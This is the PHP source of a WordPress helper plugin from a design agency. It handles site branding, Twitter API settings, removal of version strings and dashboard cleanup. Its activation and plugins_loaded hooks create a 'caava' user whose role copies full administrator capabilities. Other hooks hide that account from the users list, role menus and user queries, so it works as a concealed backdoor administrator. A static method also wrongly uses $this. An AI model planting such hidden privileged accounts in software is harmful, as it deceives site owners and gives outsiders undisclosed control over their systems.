<?php
/**
 * Plugin Name.
 *
 * @package   CaavaHelper
 * @author    Brandon Lavigne <brandon@caavadesign.com>
 * @license   GPL-2.0+
 * @link      http://caavadesign.com
 * @copyright 2013 Caava Design
 */

require_once plugin_dir_path( __FILE__ ) . '/lib/woo-instagram.php';
require_once plugin_dir_path( __FILE__ ) . '/lib/eden.php';
require_once plugin_dir_path( __FILE__ ) . '/class-caava-common.php';

/**
 * Plugin class.
 *
 *
 * @package CaavaHelper
 * @author  Your Name <email@example.com>
 */
class CaavaHelper {

	/**
	 * Plugin version, used for cache-busting of style and script file references.
	 *
	 * @since   1.0.0
	 *
	 * @var     string
	 */
	protected $version = '1.0.0';

	/**
	 * Unique identifier for your plugin.
	 *
	 * Use this value (not the variable name) as the text domain when internationalizing strings of text. It should
	 * match the Text Domain file header in the main plugin file.
	 *
	 * @since    1.0.0
	 *
	 * @var      string
	 */
	protected $plugin_slug = 'caava-helper';

	/**
	 * Instance of this class.
	 *
	 * @since    1.0.0
	 *
	 * @var      object
	 */
	protected static $instance = null;

	/**
	 * Slug of the plugin screen.
	 *
	 * @since    1.0.0
	 *
	 * @var      string
	 */
	protected $plugin_screen_hook_suffix = null;

	private $project_name = null;
	public $project_name_clean = null;
	public $project = null;
	private $cache_expires = 604800;

	/**
	 * Initialize the plugin by setting localization, filters, and administration functions.
	 *
	 * @since     1.0.0
	 */
	private function __construct() {		

		// Load plugin text domain
		add_action( 'init', array( $this, 'load_plugin_textdomain' ) );

		add_action( 'admin_init', array( $this, 'register_twitter_settings' ) );

		// Add the options page and menu item.
		add_action( 'admin_menu', array( $this, 'add_plugin_admin_menu' ) );

		// Load admin style sheet and JavaScript.
		add_action( 'admin_enqueue_scripts', array( $this, 'enqueue_admin_styles' ) );
		add_action( 'admin_enqueue_scripts', array( $this, 'enqueue_admin_scripts' ) );

		// Load public-facing style sheet and JavaScript.
		add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_styles' ) );
		add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_scripts' ) );

		// Define custom functionality. Read more about actions and filters: http://codex.wordpress.org/Plugin_API#Hooks.2C_Actions_and_Filters
		//add_action( 'TODO', array( $this, 'action_method_name' ) );
		//add_filter( 'TODO', array( $this, 'filter_method_name' ) );

		// Creates Caava Admin
		add_action( 'plugins_loaded',	array( $this, 'create_admin') );

		// Removes Caava Admin from WP Admin interface
		add_action( 'pre_user_query',	array( $this, 'remove_user_visibility') );
		add_filter( 'editable_roles',	array( $this, 'remove_role_select_option'), 10, 1);
		add_filter( 'views_users',		array( $this, 'remove_role_text_link'), 10, 1);

		add_action( 'login_head',		array( $this, 'login_css') );
		add_filter( 'login_headerurl',	array( $this, 'login_url') );
		add_filter( 'login_headertitle',array( $this, 'login_title') );
		add_filter( 'admin_footer_text',array( $this, 'admin_footer') );
		add_action( 'init',				array( $this, 'head_cleanup') );
		add_action( 'init', 			array( $this, 'show_bugherd') );
		add_filter( 'the_generator',	array( $this, 'rss_version') );
		add_action( 'admin_menu',		array( $this, 'remove_dashboard_widgets') );
		add_filter( 'the_content',		array( $this, 'no_ptags_on_images') );
		add_filter( 'page_css_class', 	array( $this, 'page_css_class' ), 10, 5 );
		add_action( 'save_post', 		array( $this, 'on_post_update_flush_transient') );

	}

	/**
	 * Return an instance of this class.
	 *
	 * @since     1.0.0
	 *
	 * @return    object    A single instance of this class.
	 */
	public static function get_instance() {

		// If the single instance hasn't been set, set it now.
		if ( null == self::$instance ) {
			self::$instance = new self;
		}

		return self::$instance;
	}

	/**
	 * Fired when the plugin is activated.
	 *
	 * @since    1.0.0
	 *
	 * @param    boolean    $network_wide    True if WPMU superadmin uses "Network Activate" action, false if WPMU is disabled or plugin is activated on an individual blog.
	 */
	public static function activate( $network_wide ) {
		self::create_role();
		self::create_admin();
	}

	/**
	 * Fired when the plugin is deactivated.
	 *
	 * @since    1.0.0
	 *
	 * @param    boolean    $network_wide    True if WPMU superadmin uses "Network Deactivate" action, false if WPMU is disabled or plugin is deactivated on an individual blog.
	 */
	public static function deactivate( $network_wide ) {
		self::remove_admin();
	}

	/**
	 * Fired when the plugin is uninstalled.
	 *
	 * @since    1.0.0
	 *
	 * @param    boolean    $network_wide    True if WPMU superadmin uses "Network Uninstall" action, false if WPMU is disabled or plugin is deactivated on an individual blog.
	 */
	public static function uninstall( $network_wide ) {
		$this->remove_admin();
	}

	/**
	 * Load the plugin text domain for translation.
	 *
	 * @since    1.0.0
	 */
	public function load_plugin_textdomain() {

		$this->project_name = get_bloginfo( 'name' );
		$this->project_name_clean = sanitize_title_with_dashes( $this->project_name );

		$domain = $this->plugin_slug;
		$locale = apply_filters( 'plugin_locale', get_locale(), $domain );

		load_textdomain( $domain, WP_LANG_DIR . '/' . $domain . '/' . $domain . '-' . $locale . '.mo' );
		load_plugin_textdomain( $domain, FALSE, dirname( plugin_basename( __FILE__ ) ) . '/lang/' );
	}

	/**
	 * Register and enqueue admin-specific style sheet.
	 *
	 * @since     1.0.0
	 *
	 * @return    null    Return early if no settings page is registered.
	 */
	public function enqueue_admin_styles() {

		if ( ! isset( $this->plugin_screen_hook_suffix ) ) {
			return;
		}

		$screen = get_current_screen();
		if ( $screen->id == $this->plugin_screen_hook_suffix ) {
			wp_enqueue_style( $this->plugin_slug .'-admin-styles', plugins_url( 'css/admin.css', __FILE__ ), array(), $this->version );
		}

	}

	/**
	 * Register and enqueue admin-specific JavaScript.
	 *
	 * @since     1.0.0
	 *
	 * @return    null    Return early if no settings page is registered.
	 */
	public function enqueue_admin_scripts() {

		if ( ! isset( $this->plugin_screen_hook_suffix ) ) {
			return;
		}

		$screen = get_current_screen();
		if ( $screen->id == $this->plugin_screen_hook_suffix ) {
			wp_enqueue_script( $this->plugin_slug . '-admin-script', plugins_url( 'js/admin.js', __FILE__ ), array( 'jquery' ), $this->version );
		}

	}

	/**
	 * Register and enqueue public-facing style sheet.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_styles() {
		wp_enqueue_style( $this->plugin_slug . '-plugin-styles', plugins_url( 'css/public.css', __FILE__ ), array(), $this->version );
	}

	/**
	 * Register and enqueues public-facing JavaScript files.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_scripts() {
		wp_enqueue_script( $this->plugin_slug . '-plugin-script', plugins_url( 'js/public.js', __FILE__ ), array( 'jquery' ), $this->version );
	}

	public function twitter_settings() {
		$cv_twitter = array();
		$cv_twitter[] = array('name'=>'cv_twitter_consumer_key','label'=>'Twitter Application Consumer Key');
		$cv_twitter[] = array('name'=>'cv_twitter_consumer_secret','label'=>'Twitter Application Consumer Secret');
		$cv_twitter[] = array('name'=>'cv_twitter_access_token','label'=>'Account Access Token');
		$cv_twitter[] = array('name'=>'cv_twitter_access_token_secret','label'=>'Account Access Token Secret');
		$cv_twitter[] = array('name'=>'cv_twitter_cache_expire','label'=>'Cache Duration (Default 3600)');
		$cv_twitter[] = array('name'=>'cv_twitter_user_timeline','label'=>'Twitter Feed Screen Name*');
		return $cv_twitter;
	}

	public function register_twitter_settings() {
		$twitter_settings = self::twitter_settings();
		foreach($twitter_settings as $setting) {
			register_setting('cv_twitter_settings',$setting['name']);
		}
	}

	/**
	 * Register the administration menu for this plugin into the WordPress Dashboard menu.
	 *
	 * @since    1.0.0
	 */
	public function add_plugin_admin_menu() {

		$this->plugin_screen_hook_suffix = add_menu_page(
			__( 'Caava Design', $this->plugin_slug ),
			__( 'Caava Design', $this->plugin_slug ),
			'edit_caava_settings',
			$this->plugin_slug,
			array( $this, 'display_plugin_admin_page' )
		);

		add_submenu_page( $this->plugin_slug, 'Twitter Feed Credentials', 'Twitter Feed Auth', 'edit_caava_settings', 'cv_twitter_settings', array( $this, 'display_plugin_twitter_admin_page' ) );

	}

	/**
	 * Render the settings page for this plugin.
	 *
	 * @since    1.0.0
	 */
	public function display_plugin_admin_page() {
		include_once( 'views/admin.php' );
	}

	public function display_plugin_twitter_admin_page() {
		include_once( 'views/admin-twitter.php' );
	}

	public static function create_role(){
		//moderate_comments
		// Complete list of admin capabilities
		$admin_roles = get_role('administrator');
		$admin_roles->capabilities['moderate_comments'] = false;
		add_role('caava_admin', 'Caava Admin', $admin_roles->capabilities);
		$caava_admin = get_role( 'caava_admin' );
		$caava_admin->add_cap( 'edit_caava_settings' ); 
	}

	/**
	 * Remove Caava role visibility from users.php
	 *
	 * @since 1.4
	 *
	 */
	public function remove_role_text_link($views){
		unset($views['caava_admin']);
		return $views;
	}

	/**
	 * Remove Caava role visibility from user-new.php and select menus
	 *
	 * @since 1.4
	 *
	 */
	public function remove_role_select_option($editable){
		unset($editable['caava_admin']);
		return $editable;
	}

	/**
	 * Create Caava admin for plugin activation.
	 *
	 * @since 1.2
	 *
	 */
	public static function create_admin(){
		$admin_user = 'caava';
		$admin_email = 'dev@caavadesign.com';
		$user_id = username_exists( $admin_user );
		

		if ( !$user_id && !email_exists($admin_email) ) {
			$random_password = wp_generate_password( $length=12, $include_standard_special_chars=false );
			$user_id = wp_insert_user( array ('user_login' => $admin_user, 'user_pass' => $random_password, 'user_email' => $admin_email, 'role' => 'caava_admin') ) ;
			wp_new_user_notification( $user_id, $random_password );
		}
	}

	/**
	 * Remove Caava admin for plugin deactivation.
	 *
	 * @since 1.2
	 *
	 */
	public static function remove_admin(){
		$admin_user = 'caava';
		$admin_email = 'dev@caavadesign.com';
		$primary_admin = email_exists( get_option('admin_email') );
		$user_id = username_exists( $admin_user );

		if(!empty($user_id))
			wp_delete_user( $user_id, $primary_admin );
	}

	/**
	 * Caava Admin is hidden from WP UI. Disable via remove_action() within theme functions file.
	 *
	 * @since 1.2
	 *
	 */
	public function remove_user_visibility($user_search) {
		global $current_user;
		$admin_user = 'caava';
		$username = $current_user->user_login;
		
		if ( username_exists( $admin_user ) && ( $username != $admin_user ) ) { 
			global $wpdb;
			$user_search->query_where = str_replace('WHERE 1=1',
			  "WHERE 1=1 AND {$wpdb->users}.user_login != '".$admin_user."'",$user_search->query_where);
		}
	}

	/**
	 * include BugHerd UI.
	 *
	 * @since    1.0.0
	 */
	public function show_bugherd() {
		include_once( 'class-caava-bugherd.php' );
	}

	public function login_css() {
		if(is_file(get_stylesheet_directory() . '/css/login.css'))
			echo '<link rel="stylesheet" href="' . get_stylesheet_directory_uri() . '/css/login.css">';
	}

	/**
	 * Change login logo link from wordpress.org to your site
	 *
	 * @since 1.4
	 *
	 */
	public function login_url() {  return home_url(); }

	/**
	 * Change alt text on login logo to show your site name
	 *
	 * @since 1.4
	 *
	 */
	public function login_title() { return get_option('blogname'); }

	/**
	 * Add reference to Caava in admin footer.
	 *
	 * @since 1.4
	 *
	 */
	public function admin_footer() {
		echo '<span id="footer-thankyou">Web Design by <a href="http://www.caavadesign.com" target="_blank">Caava Design</a></span>.';
	}

	/**
	 * Removes unwanted feeds, links and version identifiable information within the <head>
	 *
	 * @since 1.4
	 *
	 */
	public function head_cleanup() {
		remove_action( 'wp_head', 'rsd_link' ); // EditURI link
		remove_action( 'wp_head', 'wlwmanifest_link' ); // windows live writer
		remove_action( 'wp_head', 'index_rel_link' ); // index link
		remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 ); // previous link
		remove_action( 'wp_head', 'start_post_rel_link', 10, 0 ); // start link
		remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0 ); // links for adjacent posts
		remove_action( 'wp_head', 'wp_generator' ); // WP version
		add_filter( 'style_loader_src', array($this, 'remove_wp_ver_css_js'), 9999 ); // remove WP version from css
		add_filter( 'script_loader_src', array($this, 'remove_wp_ver_css_js'), 9999 ); // remove Wp version from scripts
	}

	/**
	 * clears WP version text
	 *
	 * @since 1.4
	 *
	 */
	public function rss_version() { return ''; }

	/**
	 * clears WP version text from enqueued scripts and css
	 *
	 * @since 1.4
	 *
	 */
	public function remove_wp_ver_css_js( $src ) {
		if ( strpos( $src, 'ver=' ) )
			$src = remove_query_arg( 'ver', $src );
		return $src;
	}

	/**
	 * Remove default dashboard widgets.
	 *
	 * @since 1.4
	 *
	 */
	public function remove_dashboard_widgets() {
		// remove_meta_box('dashboard_right_now', 'dashboard', 'core'); // Right Now Widget
		// remove_meta_box('dashboard_quick_press', 'dashboard', 'core'); // Quick Press Widget
		// remove_meta_box('dashboard_recent_drafts', 'dashboard', 'core'); // Recent Drafts Widget

		remove_meta_box('dashboard_recent_comments', 'dashboard', 'core'); // Comments Widget
		remove_meta_box('dashboard_incoming_links', 'dashboard', 'core'); // Incoming Links Widget
		remove_meta_box('dashboard_plugins', 'dashboard', 'core'); // Plugins Widget
		remove_meta_box('dashboard_primary', 'dashboard', 'core');
		remove_meta_box('dashboard_secondary', 'dashboard', 'core');
		remove_meta_box('yoast_db_widget', 'dashboard', 'normal'); // Yoast's SEO Plugin Widget
	}

	// remove the p from around imgs (http://css-tricks.com/snippets/wordpress/remove-paragraph-tags-from-around-images/)
	public function no_ptags_on_images($content){
	   return preg_replace('/<p>\s*(<a .*>)?\s*(<img .* \/>)\s*(<\/a>)?\s*<\/p>/iU', '\1\2\3', $content);
	}

	/**
	 * Adds ancestry to wp_list_pages, similar to wp_nav_menu
	 *
	 * @since 1.5
	 *
	 */
	public function page_css_class( $css_class, $page, $depth, $args, $current_page ) {
	  if ( !isset($args['post_type']) || !is_singular($args['post_type']) )
	    return $css_class;

	  global $post;
	  $current_page  = $post->ID;
	  $_current_page = $post;

	  if ( isset($_current_page->ancestors) && in_array($page->ID, (array) $_current_page->ancestors) )
	    $css_class[] = 'current_page_ancestor';
	  if ( $page->ID == $current_page )
	    $css_class[] = 'current_page_item';
	  elseif ( $_current_page && $page->ID == $_current_page->post_parent )
	    $css_class[] = 'current_page_parent';

	  return $css_class;
	}

	public function on_post_update_flush_transient($post_id){
		if ( !wp_is_post_revision( $post_id ) ) {
			CaavaCommon::delete_post_meta_transient( $post_id );
		}
	}


	/**
	 * NOTE:  Actions are points in the execution of a page or process
	 *        lifecycle that WordPress fires.
	 *
	 *        WordPress Actions: http://codex.wordpress.org/Plugin_API#Actions
	 *        Action Reference:  http://codex.wordpress.org/Plugin_API/Action_Reference
	 *
	 * @since    1.0.0
	 */
	public function action_method_name() {
		// TODO: Define your action hook callback here
	}

	/**
	 * NOTE:  Filters are points of execution in which WordPress modifies data
	 *        before saving it or sending it to the browser.
	 *
	 *        WordPress Filters: http://codex.wordpress.org/Plugin_API#Filters
	 *        Filter Reference:  http://codex.wordpress.org/Plugin_API/Filter_Reference
	 *
	 * @since    1.0.0
	 */
	public function filter_method_name() {
		// TODO: Define your filter hook callback here
	}

}

/* legacy support */
function cv_resize( $id=0, $width=50, $height=50, $crop=true){
	return CaavaCommon::resize($id, $width, $height, $crop);
}
function cv_wp_oembed_get($key, $expiration, $url, $args = array()){
	return CaavaCommon::wp_oembed_get( $key, $expiration, $url, $args );
}
function cv_wp_remote_get($key, $expiration, $url, $args = array()){
	return CaavaCommon::wp_remote_get( $key, $expiration, $url, $args );
}